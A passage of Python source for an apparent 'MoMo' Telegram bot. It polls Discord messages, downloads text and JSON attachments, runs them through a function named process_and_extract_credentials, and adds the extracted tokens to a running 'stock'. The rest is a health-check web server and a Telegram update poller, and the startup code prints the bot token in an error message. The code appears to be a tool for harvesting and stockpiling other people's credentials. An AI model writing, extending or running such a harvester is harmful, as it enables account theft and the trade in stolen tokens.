                            attachments = msg.get("attachments", [])
                            for att in attachments:
                                att_url = att.get("url")
                                filename = att.get("filename", "").lower()
                                if att_url and (filename.endswith(".txt") or filename.endswith(".json") or "text" in att.get("content_type", "")):
                                    try:
                                        async with http.get(att_url, timeout=10) as att_resp:
                                            if att_resp.status == 200:
                                                att_text = await att_resp.text()
                                                content += f"\n{att_text}"
                                    except Exception as att_err:
                                        logger.error(f"[Discord Sync] Attachment fetch error: {att_err}")

                            extracted = await process_and_extract_credentials(content, http=http)
                            if extracted:
                                added, total_stock = add_to_stock(extracted, http=http)
                                logger.info(f"[Discord Sync] Extracted {added} token(s) from Discord (@{author}). Total stock: {total_stock}")

                            LAST_DISCORD_MSG_ID = msg_id
                elif resp.status == 401:
                    logger.error("[Discord Sync] Invalid Discord Token! HTTP 401 Unauthorized.")
                    await asyncio.sleep(30)
        except asyncio.CancelledError:
            break
        except Exception as err:
            logger.error(f"[Discord Sync] Error polling Discord: {err}")
            await asyncio.sleep(3)

from aiohttp import web

async def health_check(request):
    return web.Response(text="Bot is online and healthy!", status=200)

async def start_web_server():
    port = int(os.getenv("PORT", "8080"))
    app = web.Application()
    app.router.add_get("/", health_check)
    app.router.add_get("/health", health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    logger.info(f"[Web Health] Listening on port {port} for cloud deployment health checks.")

async def main():
    await start_web_server()
    print(f"[System] Starting MoMo Telegram Bot (Direct Telegram API)...")
    offset = 0
    async with aiohttp.ClientSession() as http:
        # Verify bot token
        async with http.get(f"{TG_API}/getMe") as me_resp:
            me_json = await me_resp.json()
            if not me_json.get("ok"):
                print(f"Error: Invalid Telegram BOT_TOKEN: {BOT_TOKEN}")
                return
            bot_info = me_json.get("result", {})
            print(f"Telegram Bot Connected Successfully: @{bot_info.get('username')} ({bot_info.get('first_name')})")

        print("[System] Listening for updates 24/7...")
        while True:
            try:
                url = f"{TG_API}/getUpdates?offset={offset}&timeout=30"
                async with http.get(url, timeout=40) as resp:
                    data = await resp.json()
                    if data.get("ok"):
                        for update in data.get("result", []):
                            offset = update["update_id"] + 1
                            asyncio.create_task(handle_update(http, update))
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Poller exception: {e}")
                await asyncio.sleep(2)

if __name__ == "__main__":
    asyncio.run(main())
